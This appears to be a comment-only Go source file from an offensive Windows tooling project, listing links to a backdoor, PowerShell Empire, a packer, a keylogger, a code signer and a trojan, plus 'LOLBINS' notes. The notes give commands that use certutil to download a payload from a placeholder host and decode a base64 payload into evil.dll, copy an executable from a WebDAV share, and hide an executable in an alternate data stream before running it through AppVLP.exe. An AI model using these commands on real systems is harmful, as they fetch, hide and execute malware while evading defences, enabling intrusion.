package windows

/*
  * FUD BAckdoor
    https://github.com/3ct0s/fud-backdoor

  * Powershell Empire
    https://github.com/EmpireProject/Empire

  * Golang Packer
    https://github.com/nirhaas/gopacker

  * DNS Over HTTPS
    https://gist.github.com/magisterquis/d48921bcd2d9736929a7e5afea6edb87

  * Keylogger
    https://github.com/magisterquis/easylogger

  * TLS Cert generator
    https://github.com/magisterquis/httprat
    https://go.dev/src/crypto/tls/generate_cert.go

  * Code signer
    https://github.com/Tylous/Limelighter

  * Python trojan
   https://www.youtube.com/watch?v=ke8aDh_lV0Y

   * Runnig C# in powershell
    https://blog.adamfurmanek.pl/2016/03/19/executing-c-code-using-powershell-script/
*/

/*
  LOLBINS
  certutil.exe -urlcache -split -f http://myip.payload.exe delivered.exe
  certutil.exe /decode base64paload.txt evil.dll

  print /D:C\OutFolder\outfile.exe \\webdavserver\folder\file.exe

  bginfo.exec

  use an alternate data stream
  Type C:\folder\ha.exe > C:\windows\tracing\test.txt:ha.exe
  then use another binary to execute it
  AppVLP.exe C:\windows\tracing\test.txt:ha.exe
*/
